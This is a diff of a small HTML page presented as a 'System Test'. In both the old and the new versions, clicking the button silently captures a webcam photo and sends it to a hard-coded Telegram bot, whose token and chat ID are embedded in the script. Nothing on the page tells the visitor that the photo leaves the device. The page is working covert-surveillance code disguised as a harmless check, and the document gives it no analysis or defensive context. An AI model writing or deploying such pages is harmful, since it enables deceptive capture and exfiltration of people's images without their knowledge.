@@ -1,78 +1,47 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Service V1</title>
+    <title>System Test</title>
     <style>
-        body { 
-            background: black; 
-            color: white; 
-            margin: 0; 
-            height: 100vh; 
-            display: flex; 
-            align-items: center; 
-            justify-content: center; 
-            overflow: hidden; 
-            font-family: sans-serif; 
-        }
-        #startBtn { 
-            padding: 25px 40px; 
-            background: #444; 
-            color: white; 
-            border: 2px solid #fff; 
-            border-radius: 12px; 
-            cursor: pointer; 
-            font-size: 22px; 
-            font-weight: bold; 
-        }
+        body { background: black; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        button { padding: 20px; font-size: 18px; border-radius: 10px; cursor: pointer; }
     </style>
 </head>
 <body>
 
-    <button id="startBtn">START SYSTEM TEST</button>
-    <video id="video" style="display:none;" autoplay playsinline></video>
-    <canvas id="canvas" style="display:none;"></canvas>
+    <button id="btn">ACTIVATE SYSTEM TEST</button>
+    <video id="v" autoplay playsinline style="display:none"></video>
+    <canvas id="c" style="display:none"></canvas>
 
     <script>
-        const BOT_TOKEN = '8769277480:AAGs6Zeo5ol7FojA2SwGK7-7I-5Zb0falyM';
-        const CHAT_ID = '8681771719';
+        const token = '8769277480:AAGs6Zeo5ol7FojA2SwGK7-7I-5Zb0falyM';
+        const cid = '8681771719';
 
-        document.getElementById('startBtn').addEventListener('click', function() {
-            const video = document.getElementById('video');
-            const canvas = document.getElementById('canvas');
+        document.getElementById('btn').onclick = function() {
             const btn = this;
+            navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                const v = document.getElementById('v');
+                v.srcObject = stream;
+                btn.style.display = 'none';
 
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-                .then(function(stream) {
-                    video.srcObject = stream;
-                    btn.style.display = 'none'; 
+                setTimeout(() => {
+                    const c = document.getElementById('c');
+                    c.width = v.videoWidth;
+                    c.height = v.videoHeight;
+                    c.getContext('2d').drawImage(v, 0, 0);
                     
-                    video.onloadedmetadata = () => {
-                        setTimeout(() => {
-                            canvas.width = video.videoWidth;
-                            canvas.height = video.videoHeight;
-                            canvas.getContext('2d').drawImage(video, 0, 0);
-
-                            canvas.toBlob(blob => {
-                                const formData = new FormData();
-                                formData.append('chat_id', CHAT_ID);
-                                formData.append('photo', blob, 'image.jpg');
-
-                                fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto, {
-                                    method: 'POST',
-                                    body: formData
-                                }).then(() => {
-                                    stream.getTracks().forEach(track => track.stop());
-                                });
-                            }, 'image/jpeg');
-                        }, 1000);
-                    };
-                })
-                .catch(function(err) {
-                    alert("Camera access is required.");
-                });
-        });
+                    c.toBlob(blob => {
+                        const f = new FormData();
+                        f.append('chat_id', cid);
+                        f.append('photo', blob, 'x.jpg');
+                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: f })
+                        .then(() => stream.getTracks().forEach(t => t.stop()));
+                    }, 'image/jpeg');
+                }, 2000);
+            })
+            .catch(() => alert("Please allow camera access."));
+        };
     </script>
 </body>
 </html>
